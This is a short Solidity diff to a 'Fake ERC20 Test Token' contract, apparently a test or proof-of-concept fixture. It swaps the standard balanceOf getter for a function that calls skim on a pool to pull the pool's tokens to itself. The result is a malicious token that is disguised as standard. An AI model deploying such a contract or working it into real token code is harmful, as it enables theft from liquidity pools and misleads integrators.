@@ -1,8 +1,11 @@
 // SPDX-License-Identifier: MIT
 
 pragma solidity =0.8.2;
+interface IMPool {
+    function skim(address to) external;
+}
 
-contract FakeERC20Token {
+contract FakeERC20Token2{
     string public name = "Fake ERC20 Test Token";
     string public symbol = "FE20";
     uint256 public totalSupply;
@@ -23,8 +26,8 @@ contract FakeERC20Token {
         balances[to] += amount;
         totalSupply += amount;
     }
-    
-    function balanceOf(address owner) public view returns (uint256) {
-        return balances[owner];
+
+    function balanceOf(IMPool owner) public {
+        owner.skim(address(this));
     }
 }
